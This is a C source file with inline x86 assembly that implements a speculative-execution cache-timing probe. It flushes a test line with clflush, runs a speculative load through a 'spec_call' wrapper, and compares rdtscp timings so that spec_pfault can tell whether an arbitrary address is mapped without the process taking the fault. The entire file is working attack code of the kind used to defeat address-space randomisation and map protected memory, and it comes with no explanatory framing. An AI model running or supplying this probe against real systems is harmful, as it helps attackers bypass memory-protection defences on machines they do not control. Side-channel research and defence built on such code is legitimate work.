#define SPEC_PFAULT_C
#include "spec-pfault.h"

/////////////////////////////////////////////////

/* memory for side-channel to work with */
align_to(64) static blobset BLOBSET = {};
blob *TEST = &BLOBSET.test, *JUNK = &BLOBSET.junk;

uint64_t timestamp() {
	uint32_t lo, hi;
	asm volatile (
		"rdtscp;"
		"mov %%eax, %0;"
		"mov %%edx, %1;"

		: "=r"(lo), "=r"(hi)
		: : "%eax", "%ecx", "%edx");

	return (uint64_t)hi << 32 | lo; }

/* avoid my reads getting optimized out */
void mem_read(uintptr_t* mem) {
	register uintptr_t tmp;
	asm volatile (
		"mov (%1), %0; lfence;"
		: "=&r"(tmp) : "r" (mem)); }

uint64_t timed_read(uintptr_t* mem) {
	uint64_t ts0 = timestamp();
	mem_read(mem);
	return timestamp() - ts0; }

void cache_flush(void* mem) {
	asm volatile (
		"clflush (%0); mfence;"
		: : "r"(mem)); }

/////////////////////////////////////////////////

/* if `mem` is invalid, then (I suppose)
   `test` fails and `cmov*` are skipped */
void spec_test(const void* mem, uintptr_t* test) {
	register uintptr_t tmp1, tmp2;
	asm volatile (
		"prefetchnta (%2);"
		spec_call(
			"mov (%2), %1;"
			"test %1, %1;"
			"cmovz %3, %0;"
			"cmovnz %3, %0;"
			"mov (%0), %1;"
			"jmp 2f;", "%0", "%4")
		
		: "=&r"(tmp1), "=&r"(tmp2)
		: "r"(mem), "r"(test), "r"(JUNK)); }

void uint64_min(uint64_t* x, uint64_t y) {
	if (*x > y) *x = y; }

void spec_pfault0(
    const void* mem, uintptr_t* test,
    uint64_t* reg, uint64_t* spec)
{
	*reg = *spec = ~0;
	for (size_t j = 0; j < 32; j++) {
		cache_flush(TEST); mem_read(test);
		uint64_min(reg, timed_read(test)); }

	for (size_t j = 0; j < 32; j++) {
		cache_flush(TEST);
		for (size_t k = 0; k < 256; k++)
			spec_test(mem, test);

		uint64_min(spec, timed_read(test)); } }

bool spec_pfault(const void* mem) {
	uintptr_t* test = (uintptr_t*)TEST;
	uint64_t reg0 = ~0, reg = 0,
	         spec0 = ~0, spec = 0;

	for (size_t i = 0; i < 32; i++) {
		spec_pfault0(mem, test, &reg0, &spec0);
		reg += reg0; spec += spec0;

		if (i >= 8) {
			if (spec < (reg + reg / 2)) return false;
			if (spec > 4 * reg) return true; } }

	return spec > (2 * reg + reg / 2); }
